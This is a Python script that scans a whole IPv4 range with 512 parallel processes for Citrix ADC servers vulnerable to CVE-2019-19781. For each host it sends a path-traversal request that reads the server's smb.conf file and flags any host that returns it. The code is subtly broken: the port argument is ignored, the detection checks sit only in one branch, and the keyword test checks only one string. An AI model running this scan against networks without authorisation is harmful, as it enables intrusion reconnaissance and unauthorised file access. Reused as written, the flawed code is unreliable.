#!/usr/bin/env python3

import argparse
import multiprocessing
import ipaddress
import requests

from requests import ReadTimeout, ConnectTimeout, ConnectionError
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import TooManyRedirects


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def worker(targets, port):
    for target in targets:
        try:
            print('Testing: {}'.format(target), end='\r')

            if port == '80':
                req = requests.get('http://{}:{}/vpn/../vpns/cfg/smb.conf'.format(target, port), verify=False, timeout=2)
            else:
                req = requests.get('https://{}:{}/vpn/../vpns/cfg/smb.conf'.format(target, port), verify=False, timeout=2)

                if ('[global]') and ('encrypt passwords') and('name resolve order') in str(req.content):
                    print('[\033[89m!\033[0m] This Citrix ADC Server: {} is still vulnerable to CVE-2019-19781'.format(target))

                elif ('Citrix') in str(req.content) or req.status_code == 403:
                    print('[\033[92m*\033[0m] CITRIX Server found, However the server {} is not vulnerable'.format(target))

        except (ReadTimeout, TooManyRedirects, ConnectTimeout, ConnectionError):
            pass


def argparser():
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='the vulnerable server with Citrix (defaults https)')
    parser.add_argument('port', help='the target server web port (normally on 443)')

    return parser.parse_args()


if __name__ == '__main__':
    args = argparser()
    ip_list = [str(ip) for ip in ipaddress.IPv4Network(args.target)]

    jobs = []
    threads = 512
    amount = round(len(ip_list) / threads)
    limit = amount

    for f in range(threads):
        ips = ip_list[limit - amount:limit]
        j = multiprocessing.Process(target=worker, args=(ips, 443),)
        jobs.append(j)
        j.start()
        limit = limit + amount

    for j in jobs:
        j.join()
